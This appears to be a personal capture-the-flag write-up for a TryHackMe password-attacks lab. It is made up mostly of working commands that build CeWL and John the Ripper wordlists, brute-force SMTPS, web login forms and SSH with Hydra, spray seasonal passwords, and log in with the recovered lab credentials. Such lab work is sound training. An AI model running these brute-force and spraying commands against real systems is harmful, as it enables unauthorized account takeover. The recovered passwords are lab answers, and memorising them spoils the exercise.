+++
title = "Password Attacks"
+++

# https://tryhackme.com/room/passwordattacks

```bash
=================================
10.201.124.204 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.124.204' >> ~/.zshrc && source ~/.zshrc

echo '[List.Rules:thm_smtps]
Az"[0-9][0-9]" ^[!@#$]' | sudo tee -a /etc/john/john.conf

cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
john --wordlist=~/clinic.lst --rules=thm_smtps --stdout > NEW_clinic.lst
cat clinic.lst NEW_clinic.lst > MEGA_clinic.lst

hydra -l pittman@clinic.thmredteam.com -P MEGA_clinic.lst $TARGET smtps -S 465
// [465][smtp] host: 10.201.124.204   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00

# hydra -U http-get-form
#hydra -t 64 -l phillips -P MEGA_clinic.lst $TARGET http-get-form '/login-get/index.php:username=^USER^&password=^PASS^:Login failed!' -vIf
// ^^ didnt work
hydra -t 64 -l phillips -P clinic.lst $TARGET http-get-form '/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php' -vIf
// [80][http-get-form] host: 10.201.124.204   login: phillips   password: Paracetamol

# JtR Single-Extra Rules: Combines 'Single', 'Extra', and 'OldOffice' rules
# Used in Single-Crack mode to aggressively mutate a base word (like username) by appending digits, capitalizing, using common character substitutions, and adding common Office/Windows suffixes
john --wordlist=clinic.lst --rules=Single-Extra --stdout > EXPANDED_clinic.lst
hydra -t 64 -l burgess -P EXPANDED_clinic.lst $TARGET http-post-form '/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php' -vIf
// [80][http-post-form] host: 10.201.124.204   login: burgess   password: OxytocinnicotyxO

# Given user list
echo 'admin
phillips
burgess
pittman
guess' > usernames-list.txt 

# Generates password permutations for: [SEASON][YEAR][SPECIAL_CHAR]
SEASONS=('Spring' 'Summer' 'Fall' 'Winter')
YEARS=('2020' '2021')
CHARS=('!' '@' '#')
for S in "${SEASONS[@]}" ; do for Y in "${YEARS[@]}" ; do for C in "${CHARS[@]}" ; do
      echo "${S}${Y}${C}" >> final_passwords.txt
done ; done ; done

# -u for spraying to avoid account lockouts
hydra -I -u -L usernames-list.txt -P final_passwords.txt ssh://$TARGET -fV
// [22][ssh] host: 10.201.124.204   login: burgess   password: Fall2021@

sshpass -p 'Fall2021@' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 burgess@$TARGET
```